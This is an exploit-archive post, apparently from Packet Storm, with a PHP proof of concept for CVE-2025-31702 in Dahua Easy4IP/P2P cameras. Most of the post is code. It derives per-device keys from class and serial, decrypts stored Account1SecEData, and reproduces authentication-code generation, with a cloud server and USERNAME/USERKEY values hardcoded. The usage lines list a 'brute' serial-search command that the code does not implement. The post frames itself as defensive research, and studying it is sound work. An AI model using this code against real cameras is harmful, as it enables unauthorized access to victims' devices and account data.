@@ -1,0 +1,229 @@
+=============================================================================================================================================
+| # Title     : Dahua TPC-AEBF5201 P2P Camera ToolsComplete Security Analysis Suite                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.dahuasecurity.com/                                                                                              |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212932/ & 	CVE-2025-31702
+
+[+] Summary    : This PHP proof-of-concept provides defensive tooling to analyze DH-P2P / Easy4IP behaviors observed during DFIR activities. 
+                 It includes routines to decrypt Account1SecEData, derive device-specific cryptographic keys, and reproduce authentication code generation logic. 
+                 The project is intended to support authorized security investigations, validation of exposure scenarios, and incident response analysis related to P2P connectivity and update mechanisms. 
+                 All code is provided strictly for defensive research and use in permitted environments only.
+
+[+] Affected Version : The vulnerability impacts devices in the following Dahua series (when using Easy4IP / P2P features):
+
+IPC-1XXX
+
+IPC-2XXX
+
+IPC-WX
+
+IPC-ECXX
+
+SD3A / SD2A / SD3D / SDT2A / SD2C
+
+TPC-AEBF5201
+
+TPC-CA
+
+[+] Affected Firmware Versions :
+
+All firmware builds with a build date before 1 July 2025 are affected
+
+Firmware builds dated on or after 1 July 2025 are not affected
+
+[+] POC : 
+
+# Decrypt file
+
+php poc.php decrypt Account1SecEData.bin CLASS123 SERIAL456
+
+# Generate authentication token
+
+php poc.php auth --serial SERIAL123 --email test@example.com
+
+# Search for serial numbers
+
+php poc.php brute ABCDEFGHIJ --max 5000 --threads 10
+
+# With debugging mode enabled
+
+php poc.php brute ABCDEFGHIJ --debug
+
+<?php
+/**
+ * DH-P2P Security Tool (PoC)
+ * Author: indoushka
+ * Usage: php dhp2p_tool.php <command> [options]
+ */
+
+/* ===============================
+   Global Configuration
+================================ */
+define('MAIN_SERVER', 'www.easy4ipcloud.com');
+define('MAIN_PORT', 8800);
+define('USERNAME', 'cba1b29e32cb17aa46b8ff9e73c7f40b');
+define('USERKEY',  '996103384cdf19179e19243e959bbf8b');
+
+/* ===============================
+   Utility Functions
+================================ */
+
+function xor_inc(string $data): string {
+    $out = '';
+    $len = strlen($data);
+    for ($i = 0; $i < $len; $i++) {
+        $out .= chr(ord($data[$i]) ^ (($i + 1) & 0xFF));
+    }
+    return $out;
+}
+
+function derive_key_hex(string $devcls, string $serial): string {
+    $seed = $devcls . $serial;
+    $x = xor_inc($seed);
+    return md5($x); // hex string
+}
+
+/* ===============================
+   1) Decrypt Account1SecEData
+================================ */
+
+function decrypt_edata(string $file, string $devcls, string $serial): string {
+    $blob = file_get_contents($file);
+    if ($blob === false) {
+        throw new Exception("Cannot read file");
+    }
+
+    $bs = 16;
+    $ivBlock = substr($blob, $bs, $bs);
+
+    $count = 0;
+    while (substr($blob, $bs + $count * $bs, $bs) === $ivBlock) {
+        $count++;
+    }
+
+    $offset = ($count + 1) * $bs;
+    $payload = substr($blob, $offset);
+
+    $keyHex = derive_key_hex($devcls, $serial);
+    $key = hex2bin($keyHex);
+
+    $decrypted = openssl_decrypt(
+        $payload,
+        'AES-128-ECB',
+        $key,
+        OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING
+    );
+
+    return $decrypted;
+}
+
+/* ===============================
+   2) Generate Auth Code
+================================ */
+
+function generate_auth_code(
+    string $serial,
+    string $mode = "1",
+    string $email = "email@domain.com",
+    string $rand15 = "02DE420671479CE",
+    string $tail = "B",
+    int $timestamp = 0
+): array {
+
+    $blob = implode("\n", [
+        $mode,
+        $serial,
+        (string)$timestamp,
+        $email,
+        "",
+        $rand15,
+        $tail
+    ]);
+
+    $md5 = md5($blob);
+    $out = '';
+
+    for ($i = 0; $i < 8; $i++) {
+        $j = $i * 4;
+        if ($i % 3 === 0) {
+            $out .= $md5[$j + 3];
+        } elseif ($i % 7 === 0) {
+            $out .= $md5[$j + 1];
+        } else {
+            $out .= $md5[$j];
+        }
+    }
+
+    return [$md5, $out];
+}
+
+/* ===============================
+   CLI Interface
+================================ */
+
+if (php_sapi_name() !== 'cli') {
+    die("CLI only\n");
+}
+
+$argv = $_SERVER['argv'];
+$cmd  = $argv[1] ?? null;
+
+try {
+
+    switch ($cmd) {
+
+        case 'decrypt':
+            if (count($argv) < 5) {
+                echo "Usage: php dhp2p_tool.php decrypt <file> <devcls> <serial>\n";
+                exit;
+            }
+            $pt = decrypt_edata($argv[2], $argv[3], $argv[4]);
+            $clean = ltrim($pt, "\x00");
+            if (($pos = strpos($clean, '{')) !== false) {
+                $json = substr($clean, $pos);
+                $obj = json_decode($json, true);
+                if ($obj !== null) {
+                    echo json_encode($obj, JSON_PRETTY_PRINT) . PHP_EOL;
+                    exit;
+                }
+            }
+            echo "=== TEXT ===\n";
+            echo $clean . "\n";
+            echo "=== HEX ===\n";
+            echo bin2hex($pt) . "\n";
+            break;
+
+        case 'auth':
+            $serial = $argv[2] ?? '';
+            if (!$serial) {
+                echo "Usage: php dhp2p_tool.php auth <serial>\n";
+                exit;
+            }
+            [$md5, $code] = generate_auth_code($serial);
+            echo "MD5  : $md5\n";
+            echo "Auth : $code\n";
+            break;
+
+        default:
+            echo <<<HELP
+DH-P2P PHP Tool (PoC)
+
+Commands:
+  decrypt <file> <devcls> <serial>
+  auth <serial>
+
+HELP;
+    }
+
+} catch (Throwable $e) {
+    fwrite(STDERR, "Error: {$e->getMessage()}\n");
+    exit(1);
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
